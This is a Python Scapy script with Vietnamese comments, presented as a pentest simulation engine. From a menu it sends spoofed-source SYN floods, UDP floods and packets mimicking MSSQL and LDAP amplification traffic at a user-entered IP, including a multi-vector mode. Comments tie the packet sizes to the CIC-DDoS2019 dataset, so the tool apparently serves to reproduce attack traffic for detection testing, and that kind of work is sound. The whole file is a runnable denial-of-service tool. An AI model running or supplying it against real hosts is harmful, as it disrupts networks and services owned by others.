import time
import random
import sys
# Thay đổi quan trọng: Nhập thêm Ether, send (L3 Loopback) và sendp (gửi ở Tầng 2 LAN)
from scapy.sendrecv import send, sendp
from scapy.layers.l2 import Ether
from scapy.layers.inet import IP, TCP, UDP
from scapy.packet import Raw
from colorama import init, Fore, Style

init(autoreset=True)

print(Fore.RED + Style.BRIGHT + "=" * 65)
print(Fore.RED + Style.BRIGHT + " HỆ THỐNG GIẢ LẬP TẤN CÔNG (PENTEST ENGINE - L2/L3) ")
print(Fore.RED + Style.BRIGHT + "=" * 65)

TARGET_IP = input(Fore.CYAN + "[?] Nhập IP Mục tiêu (Mặc định 127.0.0.1 hoặc IP LAN): ").strip()
if not TARGET_IP:
    TARGET_IP = "127.0.0.1"

TARGET_PORT = 80
PACKET_COUNT = 1000


def dispatch_packet(ip_packet, target_ip):
    # Nếu bắn vào Loopback (127.0.0.1) thì dùng send (L3), nếu bắn qua LAN thì bọc Ether broadcast (L2)
    if target_ip == "127.0.0.1" or target_ip == "localhost":
        send(ip_packet, verbose=False)
    else:
        frame = Ether(dst="ff:ff:ff:ff:ff:ff") / ip_packet
        sendp(frame, verbose=False)


def build_syn_packet(target_ip):
    src_ip = f"10.0.0.{random.randint(1, 50)}"
    payload = Raw(b"X" * 6)
    return IP(src=src_ip, dst=target_ip) / TCP(
        sport=random.randint(1024, 65535),
        dport=TARGET_PORT,
        flags="SA",
        window=29200
    ) / payload


def build_udp_packet(target_ip):
    src_ip = f"172.16.0.{random.randint(1, 50)}"
    payload = Raw(b"X" * random.randint(250, 290))
    return IP(src=src_ip, dst=target_ip) / UDP(
        sport=random.randint(1024, 65535),
        dport=TARGET_PORT
    ) / payload


def build_mssql_packet(target_ip):
    src_ip = f"192.168.1.{random.randint(1, 50)}"
    # Kích thước chuẩn mẫu MSSQL Amplification trong CIC-DDoS2019 (410 bytes payload cố định)
    payload = Raw(b"M" * 410)
    return IP(src=src_ip, dst=target_ip) / UDP(
        sport=1434,
        dport=random.randint(1024, 65535)
    ) / payload


def build_ldap_packet(target_ip):
    src_ip = f"11.0.0.{random.randint(1, 50)}"
    # Kích thước chuẩn mẫu LDAP Amplification trong CIC-DDoS2019 (1472 bytes payload cố định)
    payload = Raw(b"L" * 1472)
    return IP(src=src_ip, dst=target_ip) / UDP(
        sport=389,
        dport=random.randint(1024, 65535)
    ) / payload


def syn_flood(target_ip, count):
    print(Fore.RED + f"\n[*] Khai hỏa SYN FLOOD vào {target_ip}...")
    for i in range(count):
        dispatch_packet(build_syn_packet(target_ip), target_ip)
        if i % 100 == 0:
            print(f"  -> Đã gửi {i} gói SYN...")


def udp_flood(target_ip, count):
    print(Fore.RED + f"\n[*] Khai hỏa UDP FLOOD vào {target_ip}...")
    for i in range(count):
        dispatch_packet(build_udp_packet(target_ip), target_ip)
        if i % 100 == 0:
            print(f"  -> Đã gửi {i} gói UDP...")


def mssql_amplification(target_ip, count):
    print(Fore.RED + f"\n[*] Khai hỏa MSSQL AMPLIFICATION vào {target_ip}...")
    for i in range(count):
        dispatch_packet(build_mssql_packet(target_ip), target_ip)
        if i % 100 == 0:
            print(f"  -> Đã gửi {i} gói MSSQL...")


def ldap_amplification(target_ip, count):
    print(Fore.RED + f"\n[*] Khai hỏa LDAP AMPLIFICATION vào {target_ip}...")
    for i in range(count):
        dispatch_packet(build_ldap_packet(target_ip), target_ip)
        if i % 100 == 0:
            print(f"  -> Đã gửi {i} gói LDAP...")


def multi_vector_attack(target_ip, count):
    print(Fore.MAGENTA + Style.BRIGHT + f"\n[*] KHAI HỎA TỔNG TẤN CÔNG ĐA HƯỚNG (MULTI-VECTOR DDoS) VÀO {target_ip}...")
    builders = [
        ("SYN FLOOD", build_syn_packet),
        ("UDP FLOOD", build_udp_packet),
        ("MSSQL AMP", build_mssql_packet),
        ("LDAP AMP", build_ldap_packet),
    ]
    stats = {"SYN FLOOD": 0, "UDP FLOOD": 0, "MSSQL AMP": 0, "LDAP AMP": 0}

    for i in range(count):
        name, builder_fn = random.choice(builders)
        dispatch_packet(builder_fn(target_ip), target_ip)
        stats[name] += 1
        if (i + 1) % 100 == 0:
            print(
                Fore.YELLOW + f"  -> Đã bắn {i + 1}/{count} gói hỗn hợp "
                f"(SYN: {stats['SYN FLOOD']} | UDP: {stats['UDP FLOOD']} | "
                f"MSSQL: {stats['MSSQL AMP']} | LDAP: {stats['LDAP AMP']})"
            )
    print(Fore.GREEN + Style.BRIGHT + "[+] Hoàn tất chiến dịch tấn công đa hướng!")


while True:
    print(Fore.CYAN + "\nCHỌN VŨ KHÍ TẤN CÔNG:")
    print("  [1] TCP SYN Flood (DDoS Tầng Giao vận)")
    print("  [2] UDP Flood (DDoS Cạn kiệt băng thông)")
    print("  [3] MSSQL Amplification (Khuếch đại - Mức độ CAO)")
    print("  [4] LDAP Amplification (Khuếch đại - Mức độ CAO)")
    print(Fore.MAGENTA + Style.BRIGHT + "  [5] Tổng tấn công đa hướng (Multi-Vector DDoS - Kết hợp cả 4 loại)")
    print("  [0] Thoát")

    choice = input(Fore.YELLOW + "Nhập lệnh (0-5): ").strip()

    if choice == '1':
        syn_flood(TARGET_IP, PACKET_COUNT)
    elif choice == '2':
        udp_flood(TARGET_IP, PACKET_COUNT)
    elif choice == '3':
        mssql_amplification(TARGET_IP, PACKET_COUNT)
    elif choice == '4':
        ldap_amplification(TARGET_IP, PACKET_COUNT)
    elif choice == '5':
        multi_vector_attack(TARGET_IP, PACKET_COUNT)
    elif choice == '0':
        sys.exit(0)
    else:
        print(Fore.RED + "[!] Lựa chọn không hợp lệ.")
